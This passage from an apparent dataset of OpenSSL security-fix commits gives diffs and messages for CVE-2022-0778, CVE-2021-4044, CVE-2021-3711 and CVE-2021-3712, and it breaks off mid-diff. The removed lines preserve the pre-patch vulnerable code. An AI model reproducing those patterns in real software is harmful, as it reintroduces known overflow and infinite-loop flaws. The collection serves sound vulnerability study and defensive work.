    \ *BN_mod_sqrt(BIGNUM *in, const BIGNUM *a, const BIGNUM *p, BN_CTX *ctx)\n /*\n\
    \  * Returns 'ret' such that ret^2 == a (mod p), using the Tonelli/Shanks\n  *\
    \ algorithm (cf. Henri Cohen, \"A Course in Algebraic Computational Number\n-\
    \ * Theory\", algorithm 1.5.1). 'p' must be prime!\n+ * Theory\", algorithm 1.5.1).\
    \ 'p' must be prime, otherwise an error or\n+ * an incorrect \"result\" will be\
    \ returned.\n  */\n {\n     BIGNUM *ret = in;\n@@ -303,18 +304,23 @@ BIGNUM *BN_mod_sqrt(BIGNUM\
    \ *in, const BIGNUM *a, const BIGNUM *p, BN_CTX *ctx)\n             goto vrfy;\n\
    \         }\n \n-        /* find smallest  i  such that  b^(2^i) = 1 */\n-   \
    \     i = 1;\n-        if (!BN_mod_sqr(t, b, p, ctx))\n-            goto end;\n\
    -        while (!BN_is_one(t)) {\n-            i++;\n-            if (i == e)\
    \ {\n-                ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);\n-           \
    \     goto end;\n+        /* Find the smallest i, 0 < i < e, such that b^(2^i)\
    \ = 1. */\n+        for (i = 1; i < e; i++) {\n+            if (i == 1) {\n+ \
    \               if (!BN_mod_sqr(t, b, p, ctx))\n+                    goto end;\n\
    +\n+            } else {\n+                if (!BN_mod_mul(t, t, t, p, ctx))\n\
    +                    goto end;\n             }\n-            if (!BN_mod_mul(t,\
    \ t, t, p, ctx))\n-                goto end;\n+            if (BN_is_one(t))\n\
    +                break;\n+        }\n+        /* If not found, a is not a square\
    \ or p is not prime. */\n+        if (i >= e) {\n+            ERR_raise(ERR_LIB_BN,\
    \ BN_R_NOT_A_SQUARE);\n+            goto end;\n         }\n \n         /* t :=\
    \ y^2^(e - i - 1) */"
  commit_message: 'Fix possible infinite loop in BN_mod_sqrt()


    The calculation in some cases does not finish for non-prime p.


    This fixes CVE-2022-0778.


    Based on patch by David Benjamin <davidben@google.com>.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 9eafb53614bf65797db25f467946e735e1b43dc9
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/x509_vfy.c\n+++ b/crypto/x509/x509_vfy.c\n@@ -630,7 +630,7\
    \ @@ static int has_san_id(X509 *x, int gtype)\n     GENERAL_NAMES *gs = X509_get_ext_d2i(x,\
    \ NID_subject_alt_name, NULL, NULL);\n \n     if (gs == NULL)\n-        return\
    \ -1;\n+        return 0;\n \n     for (i = 0; i < sk_GENERAL_NAME_num(gs); i++)\
    \ {\n         GENERAL_NAME *g = sk_GENERAL_NAME_value(gs, i);"
  commit_message: 'Fix infinite verification loops due to has_san_id


    Where name constraints apply, X509_verify() would incorrectly report an

    internal error in the event that a certificate has no SAN extension.


    CVE-2021-4044


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 6894e20b50c1204bfc990093b4e7ccd10f92865d
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/ssl/ssl_cert.c\n+++ b/ssl/ssl_cert.c\n@@ -362,6 +362,13 @@ void ssl_cert_set_cert_cb(CERT\
    \ *c, int (*cb) (SSL *ssl, void *arg), void *arg)\n     c->cert_cb_arg = arg;\n\
    \ }\n \n+/*\n+ * Verify a certificate chain\n+ * Return codes:\n+ *  1: Verify\
    \ success\n+ *  0: Verify failure or error\n+ * -1: Retry required\n+ */\n int\
    \ ssl_verify_cert_chain(SSL *s, STACK_OF(X509) *sk)\n {\n     X509 *x;\n@@ -423,10\
    \ +430,14 @@ int ssl_verify_cert_chain(SSL *s, STACK_OF(X509) *sk)\n     if (s->verify_callback)\n\
    \         X509_STORE_CTX_set_verify_cb(ctx, s->verify_callback);\n \n-    if (s->ctx->app_verify_callback\
    \ != NULL)\n+    if (s->ctx->app_verify_callback != NULL) {\n         i = s->ctx->app_verify_callback(ctx,\
    \ s->ctx->app_verify_arg);\n-    else\n+    } else {\n         i = X509_verify_cert(ctx);\n\
    +        /* We treat an error in the same way as a failure to verify */\n+   \
    \     if (i < 0)\n+            i = 0;\n+    }\n \n     s->verify_result = X509_STORE_CTX_get_error(ctx);\n\
    \     sk_X509_pop_free(s->verified_chain, X509_free);"
  - "--- a/ssl/statem/statem_clnt.c\n+++ b/ssl/statem/statem_clnt.c\n@@ -1878,7 +1878,7\
    \ @@ WORK_STATE tls_post_process_server_certificate(SSL *s, WORK_STATE wst)\n\
    \      * (less clean) historic behaviour of performing validation if any flag\
    \ is\n      * set. The *documented* interface remains the same.\n      */\n- \
    \   if (s->verify_mode != SSL_VERIFY_NONE && i <= 0) {\n+    if (s->verify_mode\
    \ != SSL_VERIFY_NONE && i == 0) {\n         SSLfatal(s, ssl_x509err2alert(s->verify_result),\n\
    \                  SSL_R_CERTIFICATE_VERIFY_FAILED);\n         return WORK_ERROR;"
  commit_message: 'Fix invalid handling of verify errors in libssl


    In the event that X509_verify() returned an internal error result then

    libssl would mishandle this and set rwstate to SSL_RETRY_VERIFY. This

    subsequently causes SSL_get_error() to return SSL_ERROR_WANT_RETRY_VERIFY.

    That return code is supposed to only ever be returned if an application

    is using an app verify callback to complete replace the use of

    X509_verify(). Applications may not be written to expect that return code

    and could therefore crash (or misbehave in some other way) as a result.


    CVE-2021-4044


    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: c1c1bb7c5e2baa109baec62d2af09d24caae5557
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/evp/m_sigver.c\n+++ b/crypto/evp/m_sigver.c\n@@ -411,14 +411,14\
    \ @@ int EVP_DigestSignFinal(EVP_MD_CTX *ctx, unsigned char *sigret,\n     if\
    \ (sigret == NULL || (ctx->flags & EVP_MD_CTX_FLAG_FINALISE) != 0)\n         return\
    \ pctx->op.sig.signature->digest_sign_final(pctx->op.sig.algctx,\n           \
    \                                               sigret, siglen,\n-           \
    \                                              SIZE_MAX);\n+                 \
    \                                        (sigret == NULL) ? 0 : *siglen);\n  \
    \   dctx = EVP_PKEY_CTX_dup(pctx);\n     if (dctx == NULL)\n         return 0;\n\
    \ \n     r = dctx->op.sig.signature->digest_sign_final(dctx->op.sig.algctx,\n\
    \                                                   sigret, siglen,\n-       \
    \                                           SIZE_MAX);\n+                    \
    \                              (sigret == NULL) ? 0 : *siglen);\n     EVP_PKEY_CTX_free(dctx);\n\
    \     return r;\n \n@@ -506,7 +506,8 @@ int EVP_DigestSign(EVP_MD_CTX *ctx, unsigned\
    \ char *sigret, size_t *siglen,\n             && pctx->op.sig.signature != NULL)\
    \ {\n         if (pctx->op.sig.signature->digest_sign != NULL)\n             return\
    \ pctx->op.sig.signature->digest_sign(pctx->op.sig.algctx,\n-                \
    \                                       sigret, siglen, SIZE_MAX,\n+         \
    \                                              sigret, siglen,\n+            \
    \                                           sigret == NULL ? 0 : *siglen,\n  \
    \                                                      tbs, tbslen);\n     } else\
    \ {\n         /* legacy */"
  - "--- a/crypto/evp/p_lib.c\n+++ b/crypto/evp/p_lib.c\n@@ -529,12 +529,14 @@ static\
    \ int get_raw_key_details(const OSSL_PARAM params[], void *arg)\n         if ((p\
    \ = OSSL_PARAM_locate_const(params, OSSL_PKEY_PARAM_PRIV_KEY))\n             \
    \    != NULL)\n             return OSSL_PARAM_get_octet_string(p, (void **)raw_key->key,\n\
    -                                               SIZE_MAX, raw_key->len);\n+  \
    \                                             raw_key->key == NULL ? 0 : *raw_key->len,\n\
    +                                               raw_key->len);\n     } else if\
    \ (raw_key->selection == OSSL_KEYMGMT_SELECT_PUBLIC_KEY) {\n         if ((p =\
    \ OSSL_PARAM_locate_const(params, OSSL_PKEY_PARAM_PUB_KEY))\n                \
    \ != NULL)\n             return OSSL_PARAM_get_octet_string(p, (void **)raw_key->key,\n\
    -                                               SIZE_MAX, raw_key->len);\n+  \
    \                                             raw_key->key == NULL ? 0 : *raw_key->len,\n\
    +                                               raw_key->len);\n     }\n \n  \
    \   return 0;"
  - "--- a/crypto/evp/signature.c\n+++ b/crypto/evp/signature.c\n@@ -582,7 +582,7\
    \ @@ int EVP_PKEY_sign(EVP_PKEY_CTX *ctx,\n         goto legacy;\n \n     ret\
    \ = ctx->op.sig.signature->sign(ctx->op.sig.algctx, sig, siglen,\n-          \
    \                            SIZE_MAX, tbs, tbslen);\n+                      \
    \                (sig == NULL) ? 0 : *siglen, tbs, tbslen);\n \n     return ret;\n\
    \  legacy:"
  commit_message: 'Prevent an overflow if an application supplies a buffer that is
    too small


    If an application bug means that a buffer smaller than is necessary is

    passed to various functions then OpenSSL does not spot that the buffer

    is too small and fills it anyway. This PR prevents that.


    Since it requires an application bug to hit this problem, no CVE is

    allocated.


    Thanks to David Benjamin for reporting this issue.


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/16789)'
  commit_sha: 43da9a14f0e73f42f28ae34219929b44df5d1a11
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/sm2/sm2_crypt.c\n+++ b/crypto/sm2/sm2_crypt.c\n@@ -67,29 +67,21\
    \ @@ static size_t ec_field_size(const EC_GROUP *group)\n     return field_size;\n\
    \ }\n \n-int ossl_sm2_plaintext_size(const EC_KEY *key, const EVP_MD *digest,\n\
    -                            size_t msg_len, size_t *pt_size)\n+int ossl_sm2_plaintext_size(const\
    \ unsigned char *ct, size_t ct_size,\n+                            size_t *pt_size)\n\
    \ {\n-    const size_t field_size = ec_field_size(EC_KEY_get0_group(key));\n-\
    \    const int md_size = EVP_MD_get_size(digest);\n-    size_t overhead;\n+  \
    \  struct SM2_Ciphertext_st *sm2_ctext = NULL;\n \n-    if (md_size < 0) {\n-\
    \        ERR_raise(ERR_LIB_SM2, SM2_R_INVALID_DIGEST);\n-        return 0;\n-\
    \    }\n-    if (field_size == 0) {\n-        ERR_raise(ERR_LIB_SM2, SM2_R_INVALID_FIELD);\n\
    -        return 0;\n-    }\n+    sm2_ctext = d2i_SM2_Ciphertext(NULL, &ct, ct_size);\n\
    \ \n-    overhead = 10 + 2 * field_size + (size_t)md_size;\n-    if (msg_len <=\
    \ overhead) {\n+    if (sm2_ctext == NULL) {\n         ERR_raise(ERR_LIB_SM2,\
    \ SM2_R_INVALID_ENCODING);\n         return 0;\n     }\n \n-    *pt_size = msg_len\
    \ - overhead;\n+    *pt_size = sm2_ctext->C2->length;\n+    SM2_Ciphertext_free(sm2_ctext);\n\
    +\n     return 1;\n }\n "
  - "--- a/providers/implementations/asymciphers/sm2_enc.c\n+++ b/providers/implementations/asymciphers/sm2_enc.c\n\
    @@ -110,7 +110,7 @@ static int sm2_asym_decrypt(void *vpsm2ctx, unsigned char\
    \ *out, size_t *outlen,\n         return 0;\n \n     if (out == NULL) {\n-   \
    \     if (!ossl_sm2_plaintext_size(psm2ctx->key, md, inlen, outlen))\n+      \
    \  if (!ossl_sm2_plaintext_size(in, inlen, outlen))\n             return 0;\n\
    \         return 1;\n     }"
  - "--- a/test/sm2_internal_test.c\n+++ b/test/sm2_internal_test.c\n@@ -183,7 +183,7\
    \ @@ static int test_sm2_crypt(const EC_GROUP *group,\n     if (!TEST_mem_eq(ctext,\
    \ ctext_len, expected, ctext_len))\n         goto done;\n \n-    if (!TEST_true(ossl_sm2_plaintext_size(key,\
    \ digest, ctext_len, &ptext_len))\n+    if (!TEST_true(ossl_sm2_plaintext_size(ctext,\
    \ ctext_len, &ptext_len))\n             || !TEST_int_eq(ptext_len, msg_len))\n\
    \         goto done;\n "
  commit_message: 'Correctly calculate the length of SM2 plaintext given the ciphertext


    Previously the length of the SM2 plaintext could be incorrectly calculated.

    The plaintext length was calculated by taking the ciphertext length and

    taking off an "overhead" value.


    The overhead value was assumed to have a "fixed" element of 10 bytes.

    This is incorrect since in some circumstances it can be more than 10 bytes.

    Additionally the overhead included the length of two integers C1x and C1y,

    which were assumed to be the same length as the field size (32 bytes for

    the SM2 curve). However in some cases these integers can have an additional

    padding byte when the msb is set, to disambiguate them from negative

    integers. Additionally the integers can also be less than 32 bytes in

    length in some cases.


    If the calculated overhead is incorrect and larger than the actual value

    this can result in the calculated plaintext length being too small.

    Applications are likely to allocate buffer sizes based on this and therefore

    a buffer overrun can occur.


    CVE-2021-3711


    Issue reported by John Ouyang.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Nicola Tuveri <nic.tuv@gmail.com>'
  commit_sha: 36cf45ef3ba71e44a8be06ee81cb31aa02cb0010
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/ec/ec_asn1.c\n+++ b/crypto/ec/ec_asn1.c\n@@ -699,7 +699,8 @@ EC_GROUP\
    \ *EC_GROUP_new_from_ecparameters(const ECPARAMETERS *params)\n \n     if (params->order\
    \ == NULL\n             || params->base == NULL\n-            || params->base->data\
    \ == NULL) {\n+            || params->base->data == NULL\n+            || params->base->length\
    \ == 0) {\n         ERR_raise(ERR_LIB_EC, EC_R_ASN1_ERROR);\n         goto err;\n\
    \     }"
  commit_message: 'Fix EC_GROUP_new_from_ecparameters to check the base length


    Check that there''s at least one byte in params->base before trying to

    read it.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 030c5aba94788f152f9ceef3549815df45bef702
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/asn1/t_spki.c\n+++ b/crypto/asn1/t_spki.c\n@@ -38,7 +38,7 @@ int\
    \ NETSCAPE_SPKI_print(BIO *out, NETSCAPE_SPKI *spki)\n     }\n     chal = spki->spkac->challenge;\n\
    \     if (chal->length)\n-        BIO_printf(out, \"  Challenge String: %s\\n\"\
    , chal->data);\n+        BIO_printf(out, \"  Challenge String: %.*s\\n\", chal->length,\
    \ chal->data);\n     i = OBJ_obj2nid(spki->sig_algor.algorithm);\n     BIO_printf(out,\
    \ \"  Signature Algorithm: %s\",\n                (i == NID_undef) ? \"UNKNOWN\"\
    \ : OBJ_nid2ln(i));"
  commit_message: 'Fix NETSCAPE_SPKI_print function to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 7c038a6bcd98d4bbfd2c2892a87a1138d2f7c5f3
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_utl.c\n+++ b/crypto/x509/v3_utl.c\n@@ -529,17 +529,25 @@\
    \ static int append_ia5(STACK_OF(OPENSSL_STRING) **sk,\n     /* First some sanity\
    \ checks */\n     if (email->type != V_ASN1_IA5STRING)\n         return 1;\n-\
    \    if (!email->data || !email->length)\n+    if (email->data == NULL || email->length\
    \ == 0)\n+        return 1;\n+    if (memchr(email->data, 0, email->length) !=\
    \ NULL)\n         return 1;\n     if (*sk == NULL)\n         *sk = sk_OPENSSL_STRING_new(sk_strcmp);\n\
    \     if (*sk == NULL)\n         return 0;\n+\n+    emtmp = OPENSSL_strndup((char\
    \ *)email->data, email->length);\n+    if (emtmp == NULL)\n+        return 0;\n\
    +\n     /* Don't add duplicates */\n-    if (sk_OPENSSL_STRING_find(*sk, (char\
    \ *)email->data) != -1)\n+    if (sk_OPENSSL_STRING_find(*sk, emtmp) != -1) {\n\
    +        OPENSSL_free(emtmp);\n         return 1;\n-    emtmp = OPENSSL_strdup((char\
    \ *)email->data);\n-    if (emtmp == NULL || !sk_OPENSSL_STRING_push(*sk, emtmp))\
    \ {\n+    }\n+    if (!sk_OPENSSL_STRING_push(*sk, emtmp)) {\n         OPENSSL_free(emtmp);\
    \ /* free on push failure */\n         X509_email_free(*sk);\n         *sk = NULL;"
  commit_message: 'Fix append_ia5 function to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 98624776c4d501c8badd6f772ab7048ac9191cb9
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/test/cmp_status_test.c\n+++ b/test/cmp_status_test.c\n@@ -58,7 +58,8 @@\
    \ static int execute_PKISI_test(CMP_STATUS_TEST_FIXTURE *fixture)\n     if (!TEST_ptr(statusString\
    \ =\n                   sk_ASN1_UTF8STRING_value(ossl_cmp_pkisi_get0_statusString(si),\n\
    \                                            0))\n-            || !TEST_str_eq(fixture->text,\
    \ (char *)statusString->data))\n+            || !TEST_mem_eq(fixture->text, strlen(fixture->text),\n\
    +                            (char *)statusString->data, statusString->length))\n\
    \         goto end;\n \n     if (!TEST_int_eq(fixture->pkifailure,"
  - "--- a/test/helpers/pkcs12.c\n+++ b/test/helpers/pkcs12.c\n@@ -479,12 +479,15\
    \ @@ static int check_asn1_string(const ASN1_TYPE *av, const char *txt)\n    \
    \     break;\n \n     case V_ASN1_UTF8STRING:\n-        if (!TEST_str_eq(txt,\
    \ (char *)av->value.utf8string->data))\n+        if (!TEST_mem_eq(txt, strlen(txt),\
    \ (char *)av->value.utf8string->data,\n+                         av->value.utf8string->length))\n\
    \             goto err;\n         break;\n \n     case V_ASN1_OCTET_STRING:\n\
    -        if (!TEST_str_eq(txt, (char *)av->value.octet_string->data))\n+     \
    \   if (!TEST_mem_eq(txt, strlen(txt),\n+                         (char *)av->value.octet_string->data,\n\
    +                         av->value.octet_string->length))\n             goto\
    \ err;\n         break;\n "
  - "--- a/test/x509_time_test.c\n+++ b/test/x509_time_test.c\n@@ -382,10 +382,12\
    \ @@ static int test_x509_time(int idx)\n \n     /* if t is not NULL but expected_string\
    \ is NULL, it is an 'OK' case too */\n     if (t != NULL && x509_format_tests[idx].expected_string)\
    \ {\n-        if (!TEST_str_eq((const char *)t->data,\n-                    x509_format_tests[idx].expected_string))\
    \ {\n-            TEST_info(\"test_x509_time(%d) failed: expected_string %s, got\
    \ %s\\n\",\n-                    idx, x509_format_tests[idx].expected_string,\
    \ t->data);\n+        if (!TEST_mem_eq((const char *)t->data, t->length,\n+  \
    \                  x509_format_tests[idx].expected_string,\n+                \
    \    strlen(x509_format_tests[idx].expected_string))) {\n+            TEST_info(\"\
    test_x509_time(%d) failed: expected_string %s, got %.*s\\n\",\n+             \
    \       idx, x509_format_tests[idx].expected_string, t->length,\n+           \
    \         t->data);\n             goto out;\n         }\n     }"
  commit_message: 'Fix test code to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 1f365708a3318a5f1a395f90c38b584a58d37fb9
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/cmp/cmp_hdr.c\n+++ b/crypto/cmp/cmp_hdr.c\n@@ -181,7 +181,8 @@ int\
    \ ossl_cmp_hdr_push1_freeText(OSSL_CMP_PKIHEADER *hdr, ASN1_UTF8STRING *text)\n\
    \         return 0;\n \n     return\n-        ossl_cmp_sk_ASN1_UTF8STRING_push_str(hdr->freeText,\
    \ (char *)text->data);\n+        ossl_cmp_sk_ASN1_UTF8STRING_push_str(hdr->freeText,\
    \ (char *)text->data,\n+                                             text->length);\n\
    \ }\n \n int ossl_cmp_hdr_generalInfo_push0_item(OSSL_CMP_PKIHEADER *hdr,"
  - "--- a/crypto/cmp/cmp_msg.c\n+++ b/crypto/cmp/cmp_msg.c\n@@ -758,13 +758,13 @@\
    \ OSSL_CMP_MSG *ossl_cmp_error_new(OSSL_CMP_CTX *ctx, const OSSL_CMP_PKISI *si,\n\
    \             goto err;\n         msg->body->value.error->errorDetails = ft;\n\
    \         if (lib != NULL && *lib != '\\0'\n-                && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft,\
    \ lib))\n+                && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft, lib, -1))\n\
    \             goto err;\n         if (reason != NULL && *reason != '\\0'\n-  \
    \              && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft, reason))\n+      \
    \          && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft, reason, -1))\n       \
    \      goto err;\n         if (details != NULL\n-                && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft,\
    \ details))\n+                && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft, details,\
    \ -1))\n             goto err;\n     }\n "
  - "--- a/crypto/cmp/cmp_status.c\n+++ b/crypto/cmp/cmp_status.c\n@@ -220,7 +220,8\
    \ @@ char *snprint_PKIStatusInfo_parts(int status, int fail_info,\n         ADVANCE_BUFFER;\n\
    \         for (i = 0; i < n_status_strings; i++) {\n             text = sk_ASN1_UTF8STRING_value(status_strings,\
    \ i);\n-            printed_chars = BIO_snprintf(write_ptr, bufsize, \"\\\"%s\\\
    \"%s\",\n+            printed_chars = BIO_snprintf(write_ptr, bufsize, \"\\\"\
    %.*s\\\"%s\",\n+                                         ASN1_STRING_length(text),\n\
    \                                          ASN1_STRING_get0_data(text),\n    \
    \                                      i < n_status_strings - 1 ? \", \" : \"\"\
    );\n             ADVANCE_BUFFER;"
  - "--- a/crypto/cmp/cmp_util.c\n+++ b/crypto/cmp/cmp_util.c\n@@ -221,15 +221,15\
    \ @@ int ossl_cmp_X509_STORE_add1_certs(X509_STORE *store, STACK_OF(X509) *certs,\n\
    \ }\n \n int ossl_cmp_sk_ASN1_UTF8STRING_push_str(STACK_OF(ASN1_UTF8STRING) *sk,\n\
    -                                         const char *text)\n+               \
    \                          const char *text, int len)\n {\n     ASN1_UTF8STRING\
    \ *utf8string;\n \n     if (!ossl_assert(sk != NULL && text != NULL))\n      \
    \   return 0;\n     if ((utf8string = ASN1_UTF8STRING_new()) == NULL)\n      \
    \   return 0;\n-    if (!ASN1_STRING_set(utf8string, text, -1))\n+    if (!ASN1_STRING_set(utf8string,\
    \ text, len))\n         goto err;\n     if (!sk_ASN1_UTF8STRING_push(sk, utf8string))\n\
    \         goto err;"
  commit_message: 'Fix CMP code to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 95f8c1e142df835d03b5b62521383a462fc5470d
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_ncons.c\n+++ b/crypto/x509/v3_ncons.c\n@@ -66,8 +66,31 @@\
    \ ASN1_SEQUENCE(NAME_CONSTRAINTS) = {\n IMPLEMENT_ASN1_ALLOC_FUNCTIONS(GENERAL_SUBTREE)\n\
    \ IMPLEMENT_ASN1_ALLOC_FUNCTIONS(NAME_CONSTRAINTS)\n \n+\n+#define IA5_OFFSET_LEN(ia5base,\
    \ offset) \\\n+    ((ia5base)->length - ((unsigned char *)(offset) - (ia5base)->data))\n\
    +\n+/* Like memchr but for ASN1_IA5STRING. Additionally you can specify the\n\
    + * starting point to search from\n+ */\n+# define ia5memchr(str, start, c) memchr(start,\
    \ c, IA5_OFFSET_LEN(str, start))\n+\n+/* Like memrrchr but for ASN1_IA5STRING\
    \ */\n+static char *ia5memrchr(ASN1_IA5STRING *str, int c)\n+{\n+    int i;\n\
    +\n+    for (i = str->length; i > 0 && str->data[i - 1] != c; i--);\n+\n+    if\
    \ (i == 0)\n+        return NULL;\n+\n+    return (char *)&str->data[i - 1];\n\
    +}\n+\n /*\n- * We cannot use strncasecmp here because that applies locale specific\
    \ rules.\n+ * We cannot use strncasecmp here because that applies locale specific\
    \ rules. It\n+ * also doesn't work with ASN1_STRINGs that may have embedded NUL\
    \ characters.\n  * For example in Turkish 'I' is not the uppercase character for\
    \ 'i'. We need to\n  * do a simple ASCII case comparison ignoring the locale (that\
    \ is why we use\n  * numeric constants below).\n@@ -92,20 +115,12 @@ static int\
    \ ia5ncasecmp(const char *s1, const char *s2, size_t n)\n \n             /* c1\
    \ > c2 */\n             return 1;\n-        } else if (*s1 == 0) {\n-        \
    \    /* If we get here we know that *s2 == 0 too */\n-            return 0;\n\
    \         }\n     }\n \n     return 0;\n }\n \n-static int ia5casecmp(const char\
    \ *s1, const char *s2)\n-{\n-    return ia5ncasecmp(s1, s2, SIZE_MAX);\n-}\n-\n\
    \ static void *v2i_NAME_CONSTRAINTS(const X509V3_EXT_METHOD *method,\n       \
    \                            X509V3_CTX *ctx, STACK_OF(CONF_VALUE) *nval)\n {\n\
    @@ -334,7 +349,7 @@ static int cn2dnsid(ASN1_STRING *cn, unsigned char **dnsid,\
    \ size_t *idlen)\n         --utf8_length;\n \n     /* Reject *embedded* NULs */\n\
    -    if ((size_t)utf8_length != strlen((char *)utf8_value)) {\n+    if (memchr(utf8_value,\
    \ 0, utf8_length) != NULL) {\n         OPENSSL_free(utf8_value);\n         return\
    \ X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n     }\n@@ -571,8 +586,12 @@ static int\
    \ nc_dns(ASN1_IA5STRING *dns, ASN1_IA5STRING *base)\n     char *dnsptr = (char\
    \ *)dns->data;\n \n     /* Empty matches everything */\n-    if (*baseptr == '\\\
    0')\n+    if (base->length == 0)\n         return X509_V_OK;\n+\n+    if (dns->length\
    \ < base->length)\n+        return X509_V_ERR_PERMITTED_VIOLATION;\n+\n     /*\n\
    \      * Otherwise can add zero or more components on the left so compare RHS\n\
    \      * and if dns is longer and expect '.' as preceding character.\n@@ -583,7\
    \ +602,7 @@ static int nc_dns(ASN1_IA5STRING *dns, ASN1_IA5STRING *base)\n   \
    \          return X509_V_ERR_PERMITTED_VIOLATION;\n     }\n \n-    if (ia5casecmp(baseptr,\
    \ dnsptr))\n+    if (ia5ncasecmp(baseptr, dnsptr, base->length))\n         return\
    \ X509_V_ERR_PERMITTED_VIOLATION;\n \n     return X509_V_OK;\n@@ -600,63 +619,90\
    \ @@ static int nc_dns(ASN1_IA5STRING *dns, ASN1_IA5STRING *base)\n static int\
    \ nc_email_eai(ASN1_TYPE *emltype, ASN1_IA5STRING *base)\n {\n     ASN1_UTF8STRING\
    \ *eml;\n-    const char *baseptr = (char *)base->data;\n+    char *baseptr =\
    \ NULL;\n     const char *emlptr;\n     const char *emlat;\n     char ulabel[256];\n\
    \     size_t size = sizeof(ulabel) - 1;\n+    int ret = X509_V_OK;\n+    size_t\
    \ emlhostlen;\n \n-    if (emltype->type != V_ASN1_UTF8STRING)\n+    /* We do\
    \ not accept embedded NUL characters */\n+    if (base->length > 0 && memchr(base->data,\
    \ 0, base->length) != NULL)\n         return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    \ \n+    /* 'base' may not be NUL terminated. Create a copy that is */\n+    baseptr\
    \ = OPENSSL_strndup((char *)base->data, base->length);\n+    if (baseptr == NULL)\n\
    +        return X509_V_ERR_OUT_OF_MEM;\n+\n+    if (emltype->type != V_ASN1_UTF8STRING)\
    \ {\n+        ret = X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n+        goto end;\n\
    +    }\n+\n     eml = emltype->value.utf8string;\n     emlptr = (char *)eml->data;\n\
    -    emlat = strrchr(emlptr, '@');\n+    emlat = ia5memrchr(eml, '@');\n \n- \
    \   if (emlat == NULL)\n-        return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    +    if (emlat == NULL) {\n+        ret = X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    +        goto end;\n+    }\n \n     memset(ulabel, 0, sizeof(ulabel));\n     /*\
    \ Special case: initial '.' is RHS match */\n     if (*baseptr == '.') {\n   \
    \      ulabel[0] = '.';\n         size -= 1;\n-        if (ossl_a2ulabel(baseptr,\
    \ ulabel + 1, &size) <= 0)\n-            return X509_V_ERR_UNSPECIFIED;\n+   \
    \     if (ossl_a2ulabel(baseptr, ulabel + 1, &size) <= 0) {\n+            ret\
    \ = X509_V_ERR_UNSPECIFIED;\n+            goto end;\n+        }\n \n-        if\
    \ ((size_t)eml->length > size + 1) {\n-            emlptr += eml->length - (size\
    \ + 1);\n-            if (ia5casecmp(ulabel, emlptr) == 0)\n-                return\
    \ X509_V_OK;\n+        if ((size_t)eml->length > strlen(ulabel)) {\n+        \
    \    emlptr += eml->length - (strlen(ulabel));\n+            /* X509_V_OK */\n\
    +            if (ia5ncasecmp(ulabel, emlptr, strlen(ulabel)) == 0)\n+        \
    \        goto end;\n         }\n-        return X509_V_ERR_PERMITTED_VIOLATION;\n\
    +        ret = X509_V_ERR_PERMITTED_VIOLATION;\n+        goto end;\n     }\n \n\
    -    emlptr = emlat + 1;\n-    if (ossl_a2ulabel(baseptr, ulabel, &size) <= 0)\n\
    -        return X509_V_ERR_UNSPECIFIED;\n+    if (ossl_a2ulabel(baseptr, ulabel,\
    \ &size) <= 0) {\n+        ret = X509_V_ERR_UNSPECIFIED;\n+        goto end;\n\
    +    }\n     /* Just have hostname left to match: case insensitive */\n-    if\
    \ (ia5casecmp(ulabel, emlptr))\n-        return X509_V_ERR_PERMITTED_VIOLATION;\n\
    -\n-    return X509_V_OK;\n+    emlptr = emlat + 1;\n+    emlhostlen = IA5_OFFSET_LEN(eml,\
    \ emlptr);\n+    if (emlhostlen != strlen(ulabel)\n+            || ia5ncasecmp(ulabel,\
    \ emlptr, emlhostlen) != 0) {\n+        ret = X509_V_ERR_PERMITTED_VIOLATION;\n\
